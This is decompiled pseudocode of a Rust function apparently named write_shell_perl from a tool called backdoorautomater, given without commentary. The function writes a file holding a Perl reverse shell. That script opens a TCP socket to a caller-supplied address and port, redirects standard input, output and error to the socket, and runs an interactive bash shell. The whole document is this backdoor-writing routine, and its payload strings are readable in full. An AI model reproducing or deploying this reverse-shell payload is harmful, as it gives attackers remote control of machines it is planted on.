long _ZN17backdoorautomater10newservice16write_shell_perl17h8f1a23ba35eb1918E
               (long param_1,long param_2)

{
  long lVar1;
  int local_8c;
  undefined8 local_88;
  long local_80;
  undefined4 local_78;
  undefined4 uStack_74;
  undefined4 uStack_70;
  undefined4 uStack_6c;
  undefined4 local_68;
  undefined4 uStack_64;
  undefined4 uStack_60;
  undefined4 uStack_5c;
  undefined8 local_58;
  undefined4 local_48;
  undefined4 uStack_44;
  undefined4 uStack_40;
  undefined4 uStack_3c;
  undefined8 local_38;
  undefined4 local_30;
  undefined4 uStack_2c;
  undefined4 uStack_28;
  undefined4 uStack_24;
  undefined8 local_20;
  
                    /* try { // try from 00159af2 to 00159b07 has its CatchHandler @ 00159dbe */
  _ZN3std2fs4File6create17hf69a1aea5d21dd7bE(&local_88,&DAT_0026619f,0x12);
  lVar1 = local_80;
  if ((int)local_88 == 0) {
    local_8c = local_88._4_4_;
                    /* try { // try from 00159b21 to 00159b7d has its CatchHandler @ 00159dab */
    lVar1 = _ZN3std2io5Write9write_all17h18f2f3ca7c9bcc20E(&local_8c,"use Socket;\n",0xc);
    if (lVar1 == 0) {
      local_78 = *(undefined4 *)(param_2 + 8);
      uStack_74 = *(undefined4 *)(param_2 + 0xc);
      uStack_70 = *(undefined4 *)(param_2 + 0x10);
      uStack_6c = *(undefined4 *)(param_2 + 0x14);
      local_88 = &DAT_00265aa3;
      local_80 = 4;
      _ZN5alloc3str17join_generic_copy17hc78a65dc4338aaa9E(&local_30,&local_88,2,1,0);
      local_58 = local_20;
      local_68 = local_30;
      uStack_64 = uStack_2c;
      uStack_60 = uStack_28;
      uStack_5c = uStack_24;
                    /* try { // try from 00159b92 to 00159c01 has its CatchHandler @ 00159d9c */
      _ZN5alloc3vec16Vec_LT_T_C_A_GT_17extend_from_slice17h3cce9f7974121c70E(&local_68,"\';\n",3);
      lVar1 = _ZN3std2io5Write9write_all17h18f2f3ca7c9bcc20E
                        (&local_8c,CONCAT44(uStack_5c,uStack_60),local_58);
      if (lVar1 == 0) {
        local_78 = *(undefined4 *)(param_1 + 8);
        uStack_74 = *(undefined4 *)(param_1 + 0xc);
        uStack_70 = *(undefined4 *)(param_1 + 0x10);
        uStack_6c = *(undefined4 *)(param_1 + 0x14);
        local_88 = "$p=";
        local_80 = 3;
        _ZN5alloc3str17join_generic_copy17hc78a65dc4338aaa9E(&local_30,&local_88,2,1,0);
        local_38 = local_20;
        local_48 = local_30;
        uStack_44 = uStack_2c;
        uStack_40 = uStack_28;
        uStack_3c = uStack_24;
                    /* try { // try from 00159c16 to 00159d1d has its CatchHandler @ 00159d8d */
        _ZN5alloc3vec16Vec_LT_T_C_A_GT_17extend_from_slice17h3cce9f7974121c70E(&local_48,";\n",2);
        lVar1 = _ZN3std2io5Write9write_all17h18f2f3ca7c9bcc20E
                          (&local_8c,CONCAT44(uStack_3c,uStack_40),local_38);
        if (((((lVar1 == 0) &&
              (lVar1 = _ZN3std2io5Write9write_all17h18f2f3ca7c9bcc20E
                                 (&local_8c,
                                  "socket(S,PF_INET,SOCK_STREAM,getprotobyname(\'tcp\'));\n",0x35),
              lVar1 == 0)) &&
             (lVar1 = _ZN3std2io5Write9write_all17h18f2f3ca7c9bcc20E
                                (&local_8c,"if(connect(S,sockaddr_in($p,inet_aton($i)))){\n",0x2e),
             lVar1 == 0)) &&
            ((lVar1 = _ZN3std2io5Write9write_all17h18f2f3ca7c9bcc20E
                                (&local_8c,"open(STDIN,\'>&S\');\n",0x13), lVar1 == 0 &&
             (lVar1 = _ZN3std2io5Write9write_all17h18f2f3ca7c9bcc20E
                                (&local_8c,"open(STDOUT,\'>&S\');\n",0x14), lVar1 == 0)))) &&
           ((lVar1 = _ZN3std2io5Write9write_all17h18f2f3ca7c9bcc20E
                               (&local_8c,"open(STDERR,\'>&S\');\n",0x14), lVar1 == 0 &&
            ((lVar1 = _ZN3std2io5Write9write_all17h18f2f3ca7c9bcc20E
                                (&local_8c,"exec(\'/usr/bin/bash -i\');\n",0x1a), lVar1 == 0 &&
             (lVar1 = _ZN3std2io5Write9write_all17h18f2f3ca7c9bcc20E(&local_8c,"};\n",3), lVar1 == 0
             )))))) {
                    /* try { // try from 00159d63 to 00159d6c has its CatchHandler @ 00159d9c */
          _ZN4core3ptr42drop_in_place_LT_alloc__string__String_GT_17h944c33df58684028E(&local_48);
                    /* try { // try from 00159d6d to 00159d76 has its CatchHandler @ 00159dab */
          _ZN4core3ptr42drop_in_place_LT_alloc__string__String_GT_17h944c33df58684028E(&local_68);
                    /* try { // try from 00159d7b to 00159d7f has its CatchHandler @ 00159dbe */
          _ZN4core3ptr34drop_in_place_LT_std__fs__File_GT_17hb99078073e1bf56bE(local_8c);
                    /* try { // try from 00159d80 to 00159d87 has its CatchHandler @ 00159db9 */
          _ZN4core3ptr42drop_in_place_LT_alloc__string__String_GT_17h944c33df58684028E(param_2);
          lVar1 = 0;
          goto LAB_00159d4b;
        }
                    /* try { // try from 00159d26 to 00159d2f has its CatchHandler @ 00159d9c */
        _ZN4core3ptr42drop_in_place_LT_alloc__string__String_GT_17h944c33df58684028E(&local_48);
      }
                    /* try { // try from 00159d30 to 00159d39 has its CatchHandler @ 00159dab */
      _ZN4core3ptr42drop_in_place_LT_alloc__string__String_GT_17h944c33df58684028E(&local_68);
    }
                    /* try { // try from 00159d3e to 00159d42 has its CatchHandler @ 00159dbe */
    _ZN4core3ptr34drop_in_place_LT_std__fs__File_GT_17hb99078073e1bf56bE(local_8c);
  }
                    /* try { // try from 00159d43 to 00159d4a has its CatchHandler @ 00159db9 */
  _ZN4core3ptr42drop_in_place_LT_alloc__string__String_GT_17h944c33df58684028E(param_2);
LAB_00159d4b:
  _ZN4core3ptr42drop_in_place_LT_alloc__string__String_GT_17h944c33df58684028E(param_1);
  return lVar1;
}